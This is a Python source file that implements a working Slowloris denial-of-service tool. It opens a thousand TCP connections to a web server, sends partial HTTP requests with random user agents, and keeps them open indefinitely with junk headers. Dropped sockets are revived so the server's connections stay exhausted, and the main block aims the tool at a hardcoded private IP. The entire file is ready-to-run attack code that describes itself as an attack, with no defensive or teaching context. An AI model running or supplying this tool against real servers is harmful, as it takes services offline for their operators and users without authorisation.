import socket
import random
import time

from .agents import random_agent

def send_line(s, data):
    s.send(bytes(f"{data}\n", 'utf8'))

def send_header(s, header, value):
    send_line(s, f"{header}: {value}")

def create_socket(host, port, prevent_cache, method, url):
    ipversion = socket.AF_INET6 if ':' in host else socket.AF_INET # Auto-determine internet protocol version

    # Open TCP socket
    s = socket.socket(ipversion, socket.SOCK_STREAM) 
    s.connect((host, port))
    
    # Send preliminary headers
    rand = ( '?' + str(random.randint(0, 65554)) ) if prevent_cache else ''
    send_line(s, f"{method} {url}{rand} HTTP/1.1") # Most frameworks require a correct start-line
    send_header(s, "User-Agent", random_agent()) # Some frameworks require an immediate user-agent definition
    return s

def loris(host, port, n, *, timing, prevent_cache, url, method):
    t0 : float
    sockets : list[socket.socket]
    try:
        # Open sockets
        print("Opening initial connections:", n)
        t0 = time.perf_counter()
        sockets = []
        for _ in range(n):
            sockets.append( create_socket(host, port, prevent_cache, method, url) )
            print("\r-> %s" % len(sockets), end='')

        td = time.perf_counter() - t0

        print()
        print(f"Initial sockets opened in {td}s")
        print("Looping keep alive..")

        # Loop keepalive
        iteration = 0
        while True:
            # Send keep alive packets
            for s in sockets:
                try:
                    send_header(s, f'X-Key-{iteration}', f'a{iteration}')
                except:
                    sockets.remove(s)

            print(f"Alive: {len(sockets)}/{n} : T+{iteration*timing}s")

            revive = n - len(sockets)
            if revive > 0:
                print(f"Reviving {revive} connections..")
                t = time.perf_counter()
                for i in range(n - len(sockets)):
                    sockets.append( create_socket(host, port, prevent_cache, method, url) )
                    print("\r-> %s" % (revive - (revive - i - 1)), end='')
                print()
                print(f"Revived {revive} connections in {time.perf_counter() - t}s")
                
            iteration += 1
            time.sleep(timing)
    except (KeyboardInterrupt):
        te = time.perf_counter()
        print("============================")
        print("Suspending slow loris attack")
        print(f"Attack time: {te - t0}s")
        print("Cleaning up connection..")
        for s in sockets:
            s.shutdown(socket.SHUT_RDWR) # Discard pending incoming data
            s.close()
        print("Done")
        
if __name__ == '__main__':
    host : str = "10.0.1.245"
    method : str = 'GET'
    url : str = '/'
    port : int = 8080
    timing : float = 2
    prevent_cache : bool = True
    loris(host, port, 1_000, timing=timing, prevent_cache=prevent_cache, url=url, method=method)
